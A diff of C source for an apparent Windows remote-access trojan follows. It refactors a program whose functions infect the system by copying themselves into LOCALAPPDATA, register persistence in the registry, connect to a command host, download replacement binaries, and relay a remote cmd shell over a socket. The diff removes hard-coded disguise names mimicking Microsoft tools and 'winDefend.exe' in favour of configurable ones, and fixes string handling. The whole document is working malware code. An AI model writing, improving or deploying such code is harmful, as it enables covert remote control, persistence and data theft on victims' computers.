@@ -5,8 +5,13 @@
 
 #include "eaSCKTBasicComProtocols.h"
 
-#define MAIN_DIR     "MicrosoftTools"
-#define PROGRAM_NAME L"winDefend.exe"
+#ifndef MAIN_FOLDER
+#define MAIN_FOLDER "folder"
+#endif
+
+#ifndef PROGRAM_NAME
+#define PROGRAM_NAME "program.exe"
+#endif
 
 #ifndef DEST_HOST
 #define DEST_HOST "127.0.0.1"
@@ -33,7 +38,7 @@ static bool connectToCMD(EASCKT sckt);
 
 bool isThePlaceToBe(const char *pathOfProgram)
 {
-    return NULL != strstr(pathOfProgram, MAIN_DIR);
+    return NULL != strstr(pathOfProgram, MAIN_FOLDER);
 }
 
 bool isTheSystemInfected(void)
@@ -44,7 +49,7 @@ bool isTheSystemInfected(void)
                     sizeof(path), 
                     L"%S\\%s", 
                     _wgetenv(L"LOCALAPPDATA"), 
-                    MAIN_DIR);
+                    MAIN_FOLDER);
 
     DWORD dwAttr = GetFileAttributesW(path);
     
@@ -61,7 +66,7 @@ const wchar_t *infectTheSystem(void)
                     sizeof(path), 
                     L"%S\\%s", 
                     _wgetenv(L"LOCALAPPDATA"), 
-                    MAIN_DIR);
+                    MAIN_FOLDER);
 
     (void)CreateDirectoryW(path, NULL);
 
@@ -69,7 +74,7 @@ const wchar_t *infectTheSystem(void)
 
     (void)snwprintf(pathWithName, 
                     sizeof(pathWithName), 
-                    L"%S\\%S", 
+                    L"%S\\%s", 
                     path,
                     PROGRAM_NAME);
 
@@ -81,8 +86,12 @@ const wchar_t *infectTheSystem(void)
                        KEY_WRITE, 
                        &hKey))
     {
+        wchar_t wText[50] = {0};
+
+        (void)mbstowcs(wText, PROGRAM_NAME, sizeof(PROGRAM_NAME) - 1U);
+
         (void)RegSetValueExW(hKey, 
-                             PROGRAM_NAME, 
+                             wText, 
                              0, 
                              REG_SZ, 
                              (BYTE *)pathWithName, 
@@ -249,13 +258,15 @@ void connectToBigBrother(void)
         if (switch_to_new_program)
         {
             wchar_t path[260 + 1];
-        
+            wchar_t wText[50] = {0};
+
+            (void)mbstowcs(wText, PROGRAM_NAME, sizeof(PROGRAM_NAME) - 1U);
             (void)snwprintf(path, 
                             sizeof(path), 
-                            L"%S\\%s\\%S", 
+                            L"%S\\%s\\%s", 
                             _wgetenv(L"LOCALAPPDATA"), 
-                            MAIN_DIR,
-                            PROGRAM_NAME);
+                            MAIN_FOLDER,
+                            wText);
             startProgram(path);
 
             break;
@@ -420,21 +431,24 @@ static bool mainProcessing(EASCKT sckt, char *text)
     else if (!strncmp(text, "update", 6U))
     {
         wchar_t path[260 + 1];
-        
+        wchar_t wText[50] = {0};
+
         (void)snwprintf(path, 
                         sizeof(path), 
                         L"%S\\%s", 
                         _wgetenv(L"LOCALAPPDATA"), 
-                        MAIN_DIR);
+                        MAIN_FOLDER);
         (void)_wchdir(path);
 
         (void)remove("old.exe");
+        
+        (void)mbstowcs(wText, PROGRAM_NAME, sizeof(PROGRAM_NAME) - 1U);
 
-        (void)MoveFileW(PROGRAM_NAME, L"old.exe");
+        (void)MoveFileW(wText, L"old.exe");
 
         if (false == recverFile(sckt))
         {
-            (void)MoveFileW(L"old.exe", PROGRAM_NAME);
+            (void)MoveFileW(L"old.exe", wText);
 
             return false;
         }
@@ -561,11 +575,11 @@ static bool connectToCMD(EASCKT sckt)
 
         if (false == recverText(sckt, chBuf, sizeof(chBuf)))
         {
-            WriteFile(hChildStd_IN_Wr, 
-                      "exit\n", 
-                      strlen("exit\n"), 
-                      &dwWritten, 
-                      NULL);
+            (void)WriteFile(hChildStd_IN_Wr, 
+                            "exit\n", 
+                            strlen("exit\n"), 
+                            &dwWritten, 
+                            NULL);
 
             if (false == senderText(sckt, "_Error_ WriteFile2"))
             {
@@ -597,8 +611,8 @@ static bool connectToCMD(EASCKT sckt)
         }
     }
 
-    CloseHandle(hChildStd_IN_Wr);
-    CloseHandle(hChildStd_OUT_Rd);
+    (void)CloseHandle(hChildStd_IN_Wr);
+    (void)CloseHandle(hChildStd_OUT_Rd);
 
     return connection;
 }
